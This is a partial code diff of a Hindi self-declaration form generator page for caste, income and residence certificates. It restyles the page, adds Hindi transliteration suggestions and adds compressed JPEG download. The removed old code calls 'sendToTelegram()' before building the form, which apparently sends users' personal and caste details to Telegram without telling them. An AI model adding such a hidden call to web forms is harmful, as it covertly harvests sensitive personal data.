@@ -3,463 +3,644 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>स्वप्रमाणित घोषणा पत्र</title>
+  <title>Rimsha Graphics - Digital Form Portal</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Kalam:wght@400;700&family=Poppins:wght@300;400;500;600;700;800&family=Anek+Devanagari:wght@400;600;700;800&display=swap');
+
+    body {
+      font-family: 'Poppins', 'Anek Devanagari', sans-serif;
+      background: #f3f7fb;
+    }
 
     .filled-data {
       font-family: 'Kalam', cursive !important;
-      border-bottom: 2px dotted #3b82f6;
-      color: #60a5fa;
+      border-bottom: 2px dotted #2563eb;
+      color: #1d4ed8;
       padding: 0 6px;
       font-weight: 700;
       display: inline-block;
-      min-width: 80px;
-    }
-    @import url('https://fonts.googleapis.com/css2?family=Kalam:wght@300;400;700&display=swap');
-
-    body,
-input,
-button,
-p,
-span,
-div{
-
-font-family:'Kalam',sans-serif;
-
-}
-.filled-data{
-
-font-family:'Kalam',sans-serif !important;
-
-}
-
-    body {
-      font-family: 'Anek Devanagari', sans-serif;
-      background: #f3f4f6;
+      min-width: 90px;
     }
 
     canvas {
-      border: 1px solid #ccc;
-      border-radius: 8px;
+      border: 2px dashed #cbd5e1;
+      border-radius: 12px;
       cursor: crosshair;
+      background: #fff;
+      touch-action: none;
     }
 
-    .popup {
+    .modal {
       display: none;
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0,0,0,0.6);
+      background: rgba(15, 23, 42, 0.4);
+      backdrop-filter: blur(8px);
       justify-content: center;
       align-items: center;
       z-index: 999;
-    }
-
-    .popup-content {
-      background: white;
-      width: 90%;
-      max-width: 900px;
-      max-height: 90vh;
-      overflow-y: auto;
-      border-radius: 15px;
       padding: 20px;
     }
 
-    @media print {
-      body * {
-        visibility: hidden;
-      }
+    .modal-content {
+      background: rgba(255, 255, 255, 0.95);
+      width: 100%;
+      max-width: 850px;
+      max-height: 90vh;
+      overflow-y: auto;
+      border-radius: 24px;
+      border: 1px solid rgba(255, 255, 255, 0.8);
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
+    }
 
-      #printArea, #printArea * {
-        visibility: visible;
-      }
-
-      #printArea {
-        position: absolute;
-        left: 0;
-        top: 0;
-        width: 100%;
-      }
+    /* गूगल इनपुट टूल्स स्टाइल लाइव सजेशन मेनू */
+    .suggestion-box {
+      position: absolute;
+      z-index: 1000;
+      background: white;
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-height: 200px;
+      overflow-y: auto;
+      display: none;
+    }
+    .suggestion-item {
+      padding: 8px 12px;
+      cursor: pointer;
+      font-size: 14px;
+      display: flex;
+      justify-content: space-between;
+      border-bottom: 1px solid #f1f5f9;
+    }
+    .suggestion-item.active {
+      background-color: #2563eb;
+      color: white;
+    }
+    .suggestion-index {
+      font-weight: bold;
+      opacity: 0.6;
+      margin-right: 8px;
     }
   </style>
 </head>
-<body class="p-6">
+<body class="min-h-screen">
 
-<div class="max-w-5xl mx-auto bg-white p-6 rounded-2xl shadow-lg">
-  <div class="flex justify-between items-center mb-6">
-    <h1 class="text-2xl font-bold text-blue-700">स्वप्रमाणित घोषणा पत्र फॉर्म </h1>(फॉर्म हिंदी में ही भरें)</h1>
-<h1 class="text-2xl font text-#FF0000-700">Designed by Rimsha Graphics </h1>
-
-    <button onclick="resetForm()" class="bg-red-500 text-white px-4 py-2 rounded-lg hover:bg-red-600">
-      Create New
-    </button>
-  </div>
-
-  <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-
-    <input type="text" id="name" placeholder="नाम" class="border p-3 rounded-lg">
-    <input type="text" id="father" placeholder="पुत्र/पुत्री/पति श्री" class="border p-3 rounded-lg">
-
-    <input type="text" id="mother" placeholder="माता श्रीमती" class="border p-3 rounded-lg">
-    <input type="date" id="dob" class="border p-3 rounded-lg">
-
-    <input type="text" id="business" placeholder="व्यवसाय" class="border p-3 rounded-lg">
-    <input type="text" id="birthPlace" placeholder="जन्म स्थान गाँव/जिला" class="border p-3 rounded-lg">
-
-    <input type="text" id="caste" placeholder="पिछड़ी/अनुसिचित जाति/अनुoजoजाति" class="border p-3 rounded-lg">
-    <input type="text" id="subcaste" placeholder="उपजाति" class="border p-3 rounded-lg">
-
-    <input type="text" id="address" placeholder="ग्राम" class="border p-3 rounded-lg">
-    <input type="text" id="police" placeholder="थाना" class="border p-3 rounded-lg">
-
-    <input type="text" id="tehsil" placeholder="तहसील" class="border p-3 rounded-lg">
-    <input type="text" id="district" placeholder="जिला" class="border p-3 rounded-lg">
-
-  </div>
-
-  <div class="mt-6 flex flex-wrap gap-4">
-    <div>
-      <label class="font-semibold block mb-2">हस्ताक्षर Upload करें</label>
-      <input type="file" id="signatureUpload" accept="image/*" class="border p-2 rounded-lg">
-    </div>
-
-    <div>
-      <label class="font-semibold block mb-2">या Draw करें</label>
-      <canvas id="signatureCanvas" width="300" height="120"></canvas>
-      <div class="mt-2 flex gap-2">
-        <button onclick="clearCanvas()" class="bg-gray-500 text-white px-3 py-1 rounded">
-          Clear
-        </button>
-      </div>
-    </div>
-  </div>
-
-  <div class="mt-6">
-    <button onclick="generateForm()" class="bg-blue-600 text-white px-6 py-3 rounded-xl hover:bg-blue-700 text-lg">
-      Generate Form
-    </button>
-  </div>
-</div>
-
-<!-- POPUP -->
-<div class="popup" id="popup">
-  <div class="popup-content">
-
-    <div id="printArea" class="p-6 border rounded-xl">
-
-      <h2 class="text-center text-2xl font-bold mb-2">
-        स्वप्रमाणित घोषणा - पत्र
-      </h2>
-
-      <h3 class="text-center text-sm mb-6 font-semibold">
-        आय/जाति/निवास प्रमाण - पत्र हेतु
-      </h3>
-
-      <p class="leading-9 text-lg text-justify">
-        मैं <span id="p_name" class="filled-data"></span>
-        पुत्र/पुत्री/पति श्री <span id="p_father" class="filled-data"></span>
-        माता श्रीमती <span id="p_mother" class="filled-data"></span>
-        जन्म तिथि <span id="p_dob" class="filled-data"></span>
-        व्यवसाय <span id="p_business" class="filled-data"></span>
-        जन्म स्थान <span id="p_birthPlace" class="filled-data"></span>
-        जाति <span id="p_caste" class="filled-data"></span>
-        उपजाति <span id="p_subcaste" class="filled-data"></span>
-        निवासी <span id="p_address" class="filled-data"></span>
-        थाना <span id="p_police" class="filled-data"></span>
-        तहसील <span id="p_tehsil" class="filled-data"></span>
-        जिला <span id="p_district" class="filled-data"></span>
-        घोषणा करता/करती हूँ कि आवेदन पत्र में दिए गये विवरण तथ्य एवं मेरी जानकारी विश्वास में शुद्ध एवं सत्य है। मैं मिथ्या विवरण तथ्यों को देने के परिणामों से भलीभांति अवगत हूँ। यदि आवेदन पत्र में दिए गये कोई विवरण/तथ्य मिथ्या पाए जाते हैं, तो मेरे विरुद्ध भा.द.वि. 1960 की धारा 199 व 200 एवं प्रभावी किसी अन्य विधि के अंतर्गत अभियोजन एवं दण्ड के लिए स्वयं उत्तरदायी होऊंगा/होऊंगी।
-      </p>
-
-      <div class="flex justify-between mt-12">
+  <!-- हेडर नेविगेशन -->
+  <nav class="bg-white/80 backdrop-blur-md border-b border-slate-100 sticky top-0 z-40">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+      <div class="flex justify-between h-20 items-center">
+        <div class="flex items-center gap-4">
+          <div class="bg-gradient-to-tr from-blue-600 to-indigo-600 text-white text-xl font-extrabold h-12 w-12 rounded-2xl flex items-center justify-center shadow-lg shadow-blue-500/30">
+            RG
+          </div>
+          <div>
+            <span class="text-2xl font-black bg-gradient-to-r from-blue-600 via-indigo-600 to-purple-600 bg-clip-text text-transparent tracking-tight block drop-shadow-sm">Rimsha Graphics</span>
+            <span class="text-xs text-slate-400 font-semibold tracking-wider uppercase">Digital Form Portal v2.0</span>
+          </div>
+        </div>
         <div>
-          <p>स्थान : <span id="p_place" class="filled-data"></span></p>
-          <p class="mt-3">दिनांक : <span id="p_date" class="filled-data"></span></p>
+          <span class="inline-flex items-center gap-2 bg-emerald-50 text-emerald-700 px-4 py-2 rounded-full font-bold text-sm border border-emerald-100">
+            <span class="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"></span> System Live
+          </span>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- मुख्य डैशबोर्ड -->
+  <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 items-start">
+      
+      <!-- लेफ्ट सेक्शन -->
+      <div class="lg:col-span-2 bg-white p-6 sm:p-8 rounded-[32px] shadow-sm border border-slate-100">
+        <div class="flex items-start gap-4 mb-6">
+          <div class="bg-blue-50 p-4 rounded-2xl text-blue-600">
+            <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path></svg>
+          </div>
+          <div>
+            <h2 class="text-2xl font-extrabold text-slate-800 tracking-tight">स्वप्रमाणित घोषणा पत्र मैनेजमेंट सिस्टम</h2>
+            <div class="h-1.5 w-16 bg-gradient-to-r from-blue-600 to-indigo-600 rounded-full mt-2"></div>
+          </div>
         </div>
 
-        <div class="text-center">
-          <img id="signaturePreview" class="h-24 mx-auto mb-2" />
-          <p>आवेदक के हस्ताक्षर</p>
+        <p class="text-slate-600 text-[15px] leading-relaxed mb-8">
+          यह वेबसाइट आय, जाति और निवास प्रमाण-पत्रों के लिए आवश्यक स्वप्रमाणित घोषणा पत्र <span class="text-blue-600 font-bold">(Self Declaration Form)</span> जनरेट करने की एक सुरक्षित और तेज़ सुविधा प्रदान करता है।
+        </p>
+
+        <!-- निर्देश सूची -->
+        <div class="border-t border-slate-100 pt-6">
+          <div class="flex items-center gap-2 mb-6">
+            <span class="text-xl">💡</span>
+            <h3 class="text-[16px] font-bold text-blue-700">फॉर्म बनाने का सही तरीका और निर्देश:</h3>
+          </div>
+
+          <div class="space-y-4">
+            <div class="flex items-center justify-between p-4 bg-slate-50 rounded-2xl border border-slate-100/80">
+              <div class="flex items-center gap-4">
+                <span class="h-8 w-8 rounded-xl bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md">01</span>
+                <p class="text-slate-700 text-sm font-medium">नीचे दिए गए <strong class="text-blue-600">"Generate Declaration Form"</strong> बटन पर क्लिक करें, जिससे डेटा एंट्री विंडो (Popup) खुल जाएगी।</p>
+              </div>
+            </div>
+
+            <div class="flex items-center justify-between p-4 bg-slate-50 rounded-2xl border border-slate-100/80">
+              <div class="flex items-center gap-4">
+                <span class="h-8 w-8 rounded-xl bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md">02</span>
+                <p class="text-slate-700 text-sm font-medium">पॉपअप में पूछी गई जानकारियों को English में टाइप करें, नीचे एक <strong>लाइव सजेशन बॉक्स</strong> खुलेगा जिससे आप सही वर्तनी चुन सकते हैं।</p>
+              </div>
+            </div>
+
+            <div class="flex items-center justify-between p-4 bg-slate-50 rounded-2xl border border-slate-100/80">
+              <div class="flex items-center gap-4">
+                <span class="h-8 w-8 rounded-xl bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md">03</span>
+                <p class="text-slate-700 text-sm font-medium">सावधानी के साथ भरें। एक बार भरा गया इनपुट, हमेशा पता, <span class="text-purple-600 font-semibold">जन्मतिथि/आधार</span> से मिलान होना आवश्यक है।</p>
+              </div>
+            </div>
+
+            <div class="flex items-center justify-between p-4 bg-slate-50 rounded-2xl border border-slate-100/80">
+              <div class="flex items-center gap-4">
+                <span class="h-8 w-8 rounded-xl bg-blue-600 text-white font-bold flex items-center justify-center text-sm shadow-md">04</span>
+                <p class="text-slate-700 text-sm font-medium">डेटा सबमिट करते ही आपका घोषणा पत्र तैयार हो जाएगा। फॉर्म डाउनलोड करें और इसे <strong class="text-blue-600">e-District</strong> पर अपलोड करने में उपयोग करें।</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- बिग जनरेट बटन -->
+        <div class="mt-8 flex justify-center">
+          <button onclick="openFormModal()" class="w-full sm:w-auto inline-flex items-center justify-center gap-4 bg-gradient-to-r from-blue-600 via-indigo-600 to-purple-600 text-white px-12 py-5 rounded-[22px] font-bold shadow-xl shadow-blue-500/20 hover:opacity-95 transition-all text-xl group">
+            <span class="bg-white/20 p-2 rounded-full text-white">
+              <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 5a1 1 0 011 1v3h3a1 1 0 110 2h-3v3a1 1 0 11-2 0v-3H6a1 1 0 110-2h3V6a1 1 0 011-1z" clip-rule="evenodd"></path></svg>
+            </span>
+            Generate Declaration Form
+            <svg class="w-5 h-5 group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M13 5l7 7-7 7M5 5l7 7-7 7"></path></svg>
+          </button>
         </div>
       </div>
 
+      <!-- राइट साइड बार -->
+      <div class="bg-gradient-to-br from-[#0b132b] via-[#1c2541] to-[#3a506b] text-white p-6 sm:p-8 rounded-[32px] shadow-xl relative overflow-hidden">
+        <div class="flex justify-between items-start mb-6">
+          <div>
+            <span class="text-xs font-semibold text-indigo-300 uppercase tracking-widest block mb-1">सिस्टम ऑप्टिमाइजेशन</span>
+            <h3 class="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-cyan-300 tracking-tight">Auto-Optimization</h3>
+          </div>
+          <span class="text-4xl">🚀</span>
+        </div>
+
+        <div class="flex items-center gap-1 mb-6 opacity-60">
+          <div class="h-[2px] w-8 bg-gradient-to-r from-transparent to-purple-500"></div>
+          <svg class="w-24 h-6 text-purple-400" fill="none" viewBox="0 0 100 24" stroke="currentColor" stroke-width="2"><path d="M0 12h20l5-8 5 16 5-11 5 6 5-3 5 3h30"></path></svg>
+          <div class="h-[2px] flex-1 bg-gradient-to-r from-purple-500 to-transparent"></div>
+        </div>
+
+        <div class="space-y-4">
+          <div class="flex items-center gap-3 bg-white/5 p-3 rounded-2xl border border-white/10">
+            <div class="flex-1 flex justify-between items-center text-sm">
+              <span class="text-slate-300">टारगेट फ़ाइल साइज़:</span>
+              <span class="bg-indigo-600/50 text-indigo-200 px-3 py-1 rounded-xl text-xs font-bold">≤ 100 KB</span>
+            </div>
+          </div>
+          <div class="flex items-center gap-3 bg-white/5 p-3 rounded-2xl border border-white/10">
+            <div class="flex-1 flex justify-between items-center text-sm">
+              <span class="text-slate-300">आउटपुट फॉर्मेट:</span>
+              <span class="bg-emerald-600/50 text-emerald-200 px-3 py-1 rounded-xl text-xs font-bold">JPEG Image</span>
+            </div>
+          </div>
+          <div class="flex items-center gap-3 bg-white/5 p-3 rounded-2xl border border-white/10">
+            <div class="flex-1 flex justify-between items-center text-sm">
+              <span class="text-slate-300">कंप्रेशन टेक्नोलॉजी:</span>
+              <span class="bg-blue-600/50 text-blue-200 px-3 py-1 rounded-xl text-xs font-bold">Smart Compress</span>
+            </div>
+          </div>
+          <div class="flex items-center gap-3 bg-white/5 p-3 rounded-2xl border border-white/10">
+            <div class="flex-1 flex justify-between items-center text-sm">
+              <span class="text-slate-300">इनपुट सिस्टम:</span>
+              <span class="bg-orange-500 text-white px-3 py-1 rounded-xl text-xs font-bold">Google Transliteration</span>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
+  </main>
 
-    <div class="flex gap-4 mt-6 justify-end">
-      <button onclick="downloadPDF()" class="bg-green-600 text-white px-5 py-2 rounded-lg">
-        Download JPEG
-      </button>
+  <!-- ================= POPUP STEP 1: PREMIUM DATA ENTRY MODAL ================= -->
+  <div class="modal" id="formModal">
+    <div class="modal-content">
+      <div class="p-6 bg-gradient-to-r from-slate-50 to-slate-100 border-b border-slate-200 flex flex-wrap justify-between items-center sticky top-0 z-10 rounded-t-24 gap-4">
+        <div>
+          <h3 class="text-xl font-bold text-slate-800">घोषणा पत्र डेटा एंट्री फॉर्म</h3>
+          <p class="text-xs text-blue-600 font-semibold mt-0.5">English में लिखें, नीचे आ रहे सही विकल्प को चुनें या Space दबाएँ</p>
+        </div>
+        <div class="flex items-center gap-4">
+          <!-- पॉपअप के अंदर ब्रांडिंग जोड़ी गई -->
+          <span class="text-sm font-black bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent tracking-tight hidden sm:inline-block">Designed by Rimsha Graphics</span>
+          <button onclick="closeFormModal()" class="text-slate-400 hover:text-slate-600 bg-white p-2 border rounded-xl shadow-sm transition-transform hover:scale-105">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+          </button>
+        </div>
+      </div>
 
-      <button onclick="closePopup()" class="bg-red-500 text-white px-5 py-2 rounded-lg">
-        Close
-      </button>
+      <div class="p-6 space-y-6">
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">नाम</label><input type="text" id="name" placeholder="English में टाइप करें..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-name" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">पुत्र/पुत्री/पति श्री</label><input type="text" id="father" placeholder="पिता/पति का नाम..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-father" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">माता श्रीमती</label><input type="text" id="mother" placeholder="माता का नाम..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-mother" class="suggestion-box"></div></div>
+          <div><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">जन्म तिथि</label><input type="date" id="dob" class="border border-slate-200 p-3 rounded-xl w-full focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">व्यवसाय</label><input type="text" id="business" placeholder="जैसे: कृषि, व्यापार, मजदूरी..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-business" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">जन्म स्थान</label><input type="text" id="birthPlace" placeholder="गाँव या जिला..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-birthPlace" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">जाति वर्ग</label><input type="text" id="caste" placeholder="पिछड़ी / अनुसूचित / सामान्य..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-caste" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">उपजाति</label><input type="text" id="subcaste" placeholder="जैसे: यादव, मौर्य, जाटव..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-subcaste" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">ग्राम / मोहल्ला निवासी</label><input type="text" id="address" placeholder="पूरा पता लिखें..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-address" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">थाना</label><input type="text" id="police" placeholder="थाना का नाम..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-police" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">तहसील</label><input type="text" id="tehsil" placeholder="तहसील का नाम..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-tehsil" class="suggestion-box"></div></div>
+          <div class="relative"><label class="block text-xs font-bold text-slate-500 uppercase mb-1 tracking-wider">जिला</label><input type="text" id="district" placeholder="जिला का नाम..." class="border border-slate-200 p-3 rounded-xl w-full hindi-input focus:ring-2 focus:ring-blue-500 focus:outline-none transition-all"><div id="suggest-district" class="suggestion-box"></div></div>
+        </div>
+
+        <div class="border-t border-slate-100 pt-4 flex flex-wrap gap-6 items-start">
+          <div class="flex-1 min-w-[250px]">
+            <label class="block text-sm font-semibold text-slate-700 mb-1">हस्ताक्षर अपलोड करें</label>
+            <input type="file" id="signatureUpload" accept="image/*" class="border p-2 rounded-xl w-full text-sm">
+          </div>
+          <div>
+            <label class="block text-sm font-semibold text-slate-700 mb-1">या स्क्रीन पर Draw करें</label>
+            <canvas id="signatureCanvas" width="300" height="120"></canvas>
+            <button onclick="clearCanvas()" class="mt-2 bg-slate-200 text-slate-700 text-xs px-3 py-1.5 rounded-lg font-medium hover:bg-slate-300">Clear Drawing</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="p-4 bg-slate-50 border-t border-slate-200 flex justify-end gap-3 rounded-b-24">
+        <button onclick="closeFormModal()" class="bg-white border text-slate-700 px-5 py-2.5 rounded-xl text-sm font-semibold hover:bg-slate-100">Cancel</button>
+        <button onclick="submitDataAndGenerate()" class="bg-blue-600 text-white px-6 py-2.5 rounded-xl text-sm font-semibold hover:bg-blue-700 shadow-md">Submit & Preview</button>
+      </div>
     </div>
-
   </div>
-</div>
 
-<script>
-  const canvas = document.getElementById('signatureCanvas');
-  const ctx = canvas.getContext('2d');
+  <!-- ================= POPUP STEP 2: FINALISED READY FORM MODAL ================= -->
+  <div class="modal" id="resultModal">
+    <div class="modal-content max-w-[780px]">
+      <div class="p-4 bg-slate-50 border-b border-slate-200 flex justify-between items-center rounded-t-24">
+        <span class="text-sm font-bold text-slate-700">Digital Preview (Ready to Download)</span>
+        <button onclick="closeResultModal()" class="text-slate-400 hover:text-slate-600">&times;</button>
+      </div>
 
-  let drawing = false;
+      <div class="p-6 bg-slate-100 overflow-x-auto flex justify-center">
+        <!-- प्रिंटिंग एरिया (स्ट्रिक्ट चौड़ाई मोबाइल रिस्पॉन्सिव फोर्स को ब्लॉक करने के लिए) -->
+        <div id="printArea" style="width: 700px; min-width: 700px; max-width: 700px;" class="p-8 bg-white shadow-sm select-none mx-auto">
+          <h2 class="text-center text-2xl font-bold mb-1 text-slate-800 tracking-wide">स्वप्रमाणित घोषणा - पत्र</h2>
+          <h3 class="text-center text-sm mb-8 font-semibold text-slate-500">आय/जाति/निवास प्रमाण - पत्र हेतु</h3>
 
-  canvas.addEventListener('mousedown', startDraw);
-canvas.addEventListener('mouseup', stopDraw);
-canvas.addEventListener('mousemove', draw);
+          <p class="leading-9 text-base text-justify text-slate-900 tracking-normal">
+            मैं <span id="p_name" class="filled-data"></span> 
+            पुत्र/पुत्री/पति श्री <span id="p_father" class="filled-data"></span> 
+            माता श्रीमती <span id="p_mother" class="filled-data"></span> 
+            जन्म तिथि <span id="p_dob" class="filled-data"></span> 
+            व्यवसाय <span id="p_business" class="filled-data"></span> 
+            जन्म स्थान <span id="p_birthPlace" class="filled-data"></span> 
+            जाति <span id="p_caste" class="filled-data"></span> 
+            उपजाति <span id="p_subcaste" class="filled-data"></span> 
+            निवासी <span id="p_address" class="filled-data"></span> 
+            थाना <span id="p_police" class="filled-data"></span> 
+            तहसील <span id="p_tehsil" class="filled-data"></span> 
+            जिला <span id="p_district" class="filled-data"></span> 
+            घोषणा करता/करती हूँ कि आवेदन पत्र में दिए गये विवरण तथ्य एवं मेरी जानकारी विश्वास में शुद्ध एवं सत्य है। मैं मिथ्या विवरण तथ्यों को देने के परिणामों से भलीभांति अवगत हूँ। यदि आवेदन पत्र में दिए गये कोई विवरण/तथ्य मिथ्या पाए जाते हैं, तो मेरे विरुद्ध भा.द.वि. 1860 की धारा 199 व 200 एवं प्रभावी किसी अन्य विधि के अंतर्गत अभियोजन एवं दण्ड के लिए स्वयं उत्तरदायी होऊंगा/होऊंगी।
+          </p>
 
-canvas.addEventListener('touchstart', function(e){
+          <div class="flex justify-between items-end mt-16">
+            <div class="text-sm space-y-2">
+              <p>स्थान : <span id="p_place" class="filled-data"></span></p>
+              <p>दिनांक : <span id="p_date" class="filled-data"></span></p>
+            </div>
+            <div class="text-center">
+              <div class="h-20 w-44 flex items-end justify-center mx-auto mb-2 overflow-hidden">
+                <img id="signaturePreview" class="max-h-full max-w-full object-contain" alt="Signature"/>
+              </div>
+              <p class="text-xs font-bold text-slate-700 uppercase tracking-wider">आवेदक के हस्ताक्षर</p>
+            </div>
+          </div>
+        </div>
+      </div>
 
-e.preventDefault();
+      <!-- रीसेट और डाउनलोड एक्शन्स बार -->
+      <div class="p-4 bg-slate-50 border-t border-slate-200 flex justify-between items-center rounded-b-24 flex-wrap gap-2">
+        <button onclick="systemGlobalReset()" class="bg-red-500 text-white px-5 py-2.5 rounded-xl text-sm font-semibold hover:bg-red-600 transition-colors shadow-sm">
+          Reset & New Entry
+        </button>
+        <div class="flex gap-2">
+          <button onclick="closeResultModal(); openFormModal();" class="bg-white border text-slate-700 px-5 py-2.5 rounded-xl text-sm font-medium hover:bg-slate-100">Back</button>
+          <button onclick="downloadCompressedJPEG()" class="bg-emerald-600 text-white px-6 py-2.5 rounded-xl text-sm font-semibold hover:bg-emerald-700 shadow-md">Download (&lt;100KB)</button>
+        </div>
+      </div>
+    </div>
+  </div>
 
-drawing=true;
+  <script>
+    // --- 1. हिंग्लिश टू हिंदी इनपुट इंजन सजेशन मेनू के साथ ---
+    let currentActiveSuggestionIndex = -1;
+    let currentActiveSuggestions = [];
 
-const rect=canvas.getBoundingClientRect();
-
-ctx.beginPath();
-
-ctx.moveTo(
-e.touches[0].clientX-rect.left,
-e.touches[0].clientY-rect.top
-);
-
-});
-
-canvas.addEventListener('touchmove', function(e){
-
-if(!drawing)return;
-
-e.preventDefault();
-
-const rect=canvas.getBoundingClientRect();
-
-ctx.lineWidth=2;
-
-ctx.lineCap='round';
-
-ctx.strokeStyle='black';
-
-ctx.lineTo(
-e.touches[0].clientX-rect.left,
-e.touches[0].clientY-rect.top
-);
-
-ctx.stroke();
-
-});
-
-canvas.addEventListener('touchend', function(){
-
-drawing=false;
-
-});
-
-  function startDraw(e) {
-    drawing = true;
-    ctx.beginPath();
-    ctx.moveTo(e.offsetX, e.offsetY);
-  }
-
-  function stopDraw() {
-    drawing = false;
-  }
-
-  function draw(e) {
-    if (!drawing) return;
-
-    ctx.lineWidth = 2;
-    ctx.lineCap = 'round';
-    ctx.strokeStyle = 'black';
-
-    ctx.lineTo(e.offsetX, e.offsetY);
-    ctx.stroke();
-  }
-
-  function clearCanvas() {
-    ctx.clearRect(0, 0, canvas.width, canvas.height);
-  }
-
-  async function generateForm() {
-
-  const requiredFields = [
-    { id: "name", label: "नाम" },
-    { id: "father", label: "पिता/पति का नाम" },
-    { id: "mother", label: "माता का नाम" },
-    { id: "dob", label: "जन्म तिथि" },
-    { id: "business", label: "व्यवसाय" },
-    { id: "birthPlace", label: "जन्म स्थान" },
-    { id: "caste", label: "जाति" },
-    { id: "subcaste", label: "उपजाति" },
-    { id: "address", label: "ग्राम" },
-    { id: "police", label: "थाना" },
-    { id: "tehsil", label: "तहसील" },
-    { id: "district", label: "जिला" }
-  ];
-
-  for (const field of requiredFields) {
-    const input = document.getElementById(field.id);
-
-    if (!input.value.trim()) {
-      alert(field.label + " भरना अनिवार्य है");
-      input.focus();
-      return;
+    async function getHindiSuggestions(word) {
+      if (!word.trim() || !/^[a-zA-Z]+$/.test(word)) return [];
+      try {
+        const res = await fetch(`https://inputtools.google.com/request?text=${encodeURIComponent(word)}&itc=hi-t-i0-und&num=5`);
+        const json = await res.json();
+        if (json && json[0] === "SUCCESS") {
+          return json[1][0][1] || [];
+        }
+      } catch (err) {
+        console.error("Transliteration Fail:", err);
+      }
+      return [word];
     }
-  }
 
-  await sendToTelegram();
+    document.querySelectorAll('.hindi-input').forEach(box => {
+      const suggestBox = document.getElementById('suggest-' + box.id);
 
-  document.getElementById('p_name').innerText = document.getElementById('name').value;
-  document.getElementById('p_father').innerText = document.getElementById('father').value;
-  document.getElementById('p_mother').innerText = document.getElementById('mother').value;
-  document.getElementById('p_dob').innerText = document.getElementById('dob').value;
-  document.getElementById('p_business').innerText = document.getElementById('business').value;
-  document.getElementById('p_birthPlace').innerText = document.getElementById('birthPlace').value;
-  document.getElementById('p_caste').innerText = document.getElementById('caste').value;
-  document.getElementById('p_subcaste').innerText = document.getElementById('subcaste').value;
